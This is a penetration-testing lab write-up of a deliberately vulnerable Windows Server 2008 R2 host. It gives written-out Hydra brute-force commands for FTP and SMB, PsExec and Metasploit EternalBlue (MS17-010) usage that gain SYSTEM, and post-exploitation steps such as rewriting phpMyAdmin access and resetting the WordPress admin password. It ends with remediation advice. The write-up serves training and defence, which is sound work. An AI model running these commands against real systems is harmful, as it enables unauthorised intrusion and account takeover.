---
title: "Black Box Penetration Test - Windows"
description: "Full black-box assessment of a multi-service Windows Server 2008 R2 host: enumerating a large attack surface (IIS FTP, GlassFish, Elasticsearch, Jenkins, WampServer/WordPress/phpMyAdmin, SMB, SSH, MySQL) and demonstrating several paths to SYSTEM via SMB brute-force + PsExec, EternalBlue, and database/web abuse."
date: 2025-11-25
platform: "INE Labs"
difficulty: "Hard"
tags: ["Black Box", "Metasploit", "IIS FTP", "SMB", "PsExec", "EternalBlue", "MS17-010", "Hydra", "MySQL", "WordPress", "Windows"]
cover: "./photo5.png"
---

# Black Box Penetration Test - Windows

**Classification:** Host & Network Penetration Testing / Exploitation<br>
**Target:** demo.ine.local — VAGRANT-2008R2, Windows Server 2008 R2 (6.1 Build 7601 SP1)<br>
**Attacker:** Kali (MSF)

> The lab IP changed between sessions (`10.2.31.69`, `10.2.29.212`); the methodology is
> identical. Common credential across services: `vagrant:vagrant` / `administrator:vagrant`.

## 1. Executive Summary

A black-box assessment of a deliberately-vulnerable Windows Server 2008 R2 host exposing a
large stack (IIS FTP, GlassFish, Elasticsearch, Jenkins, WampServer with WordPress +
phpMyAdmin, SMB, OpenSSH, MySQL). After full enumeration, multiple compromise paths are
shown — the most direct being **SMB brute-force + PsExec** and the **EternalBlue
(MS17-010)** exploit, both landing `NT AUTHORITY\SYSTEM` — followed by database/web
post-exploitation (phpMyAdmin config rewrite and WordPress admin takeover).

## 2. Enumeration

```bash
ping -c 4 demo.ine.local
db_nmap -sS -sU -p- --open -Pn -n <target>
hosts ; services
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scan](./photo3.png)

![TCP ports](./photo4.png)

![Services and OS — Windows Server 2008 R2](./photo5.png)

![OS detection (cont.)](./photo6.png)

Default scripts against the first 10,000 ports, then manually probing interesting ones.

```bash
db_nmap -sV -sC -p1-10000 <target>
```

![Default-script scan](./photo7.png)

- **HTTP** on 80 (static site with an image)
- **GlassFish** admin on 4848, status on 8080
- **Elasticsearch** API on 9200
- **Jenkins** on 8484
- **WampServer** on 8585 → **WordPress** + **phpMyAdmin**

![HTTP site on 80](./photo8.png)

![GlassFish on 4848](./photo9.png)

![GlassFish status on 8080](./photo10.png)

![Elasticsearch API on 9200](./photo11.png)

![Jenkins on 8484](./photo12.png)

![WampServer on 8585](./photo13.png)

![WordPress + phpMyAdmin](./photo14.png)

Importing the Nmap XML into MSF, then fingerprinting SMB.

```bash
db_import scan.xml
use auxiliary/scanner/smb/smb_version
```

![Importing the XML into MSF](./photo15.png)

![SMB version](./photo16.png)

## 3. Microsoft IIS FTP

IIS FTP often shares the web root with the IIS site.

```bash
db_nmap -sV -sC -p21 <target>
```

![IIS FTP default scripts](./photo17.png)

Anonymous login is not allowed.

![Anonymous login check](./photo18.png)

![No anonymous access](./photo19.png)

Brute-forcing the FTP service.

```bash
hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <target> ftp
```

![FTP brute-force](./photo20.png)

```
vagrant:vagrant | administrator:vagrant
```

![FTP credentials found](./photo21.png)

The site executes ASP, so we try an ASP reverse shell (often blocked by the host's
protections).

![ASP script executes from the website](./photo22.png)

![Generating an ASP reverse shell (1)](./photo23.png)

![Generating an ASP reverse shell (2)](./photo24.png)

![Setting up the handler (1)](./photo25.png)

![Setting up the handler (2)](./photo26.png)

![Host protection blocks the ASP shell](./photo27.png)

As a lower-impact demonstration, we download and modify `index.html` (web-root write via FTP).

![Downloading index.html](./photo28.png)

![Modifying index.html (1)](./photo29.png)

![Modifying index.html (2)](./photo30.png)

![Modified page served (3)](./photo31.png)

## 4. OpenSSH

```bash
db_nmap -sV -sC -p22 <target>
searchsploit openssh <version>
```

![SSH default scripts](./photo32.png)

![Searchsploit — OpenSSH](./photo33.png)

Brute-forcing SSH.

![SSH brute-force (1)](./photo34.png)

![SSH brute-force (2)](./photo35.png)

> Here the `administrator` account does **not** reuse the earlier password, and the SSH
> session is not upgradeable with `-u`.

![administrator has a different SSH password](./photo36.png)

![Administrators group membership](./photo37.png)

![Current user privileges](./photo38.png)

## 5. SMB → SYSTEM

```bash
db_nmap -sV -sC -p445 <target>
```

![SMB default scripts](./photo39.png)

Brute-forcing SMB recovers `administrator:vagrant` and `vagrant:vagrant`.

```bash
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <target> smb
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt <target> smb
```

![SMB brute-force — administrator:vagrant / vagrant:vagrant](./photo40.png)

Enumerating shares and users.

```bash
smbmap -H <target> -u administrator -p vagrant
enum4linux -a <target>
```

![smbmap — shares](./photo41.png)

![enum4linux (1)](./photo42.png)

![enum4linux (2)](./photo43.png)

![enum4linux (3)](./photo44.png)

### Path A — PsExec

```bash
psexec.py administrator:vagrant@<target>
```

![psexec.py — administrator session](./photo45.png)

```bash
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass vagrant
exploit
```

![MSF psexec — Meterpreter session](./photo46.png)

### Path B — EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit
getuid      # NT AUTHORITY\SYSTEM
```

The exploit lands a SYSTEM session on **VAGRANT-2008R2**.

![EternalBlue — SYSTEM on VAGRANT-2008R2](./photo47.png)

## 6. MySQL & Web Post-Exploitation

```bash
db_nmap -sV -sC -p3306 <target>
searchsploit mysql 5.5
```

![MySQL default scripts](./photo48.png)

![Searchsploit — MySQL 5.5](./photo49.png)

Brute-forcing MySQL.

![MySQL brute-force](./photo50.png)

phpMyAdmin is locally restricted, so via the Meterpreter session we rewrite
`alias/phpmyadmin.conf` to allow our access.

![Editing phpmyadmin.conf (1)](./photo51.png)

![Editing phpmyadmin.conf (2)](./photo52.png)

![Original config](./photo53.png)

![Fixed config](./photo54.png)

Restarting the Wamp service to apply it.

![Restarting Wamp (1)](./photo55.png)

![Restarting Wamp (2)](./photo56.png)

With phpMyAdmin access we edit the WordPress `wp_users` table, setting the admin password to
a known value.

![Editing the WordPress admin password](./photo57.png)

Then log into WordPress with the new password.

![WordPress login](./photo58.png)

![WordPress admin dashboard](./photo59.png)

## 7. Remediation Recommendations

1. **Patch MS17-010 (EternalBlue)** and retire end-of-life Windows Server 2008 R2.
2. **Change all default/shared credentials** (`vagrant:vagrant`) and enforce strong,
   unique passwords with lockout; use LAPS for local admin.
3. **Reduce the attack surface** — don't co-host GlassFish, Jenkins, Elasticsearch, WAMP,
   phpMyAdmin and MySQL on one internet-facing box; restrict admin panels to localhost/VPN.
4. **Harden SMB** (signing, disable SMBv1), **separate FTP from the web root**, and keep
   MySQL/WordPress patched with least-privilege DB accounts.
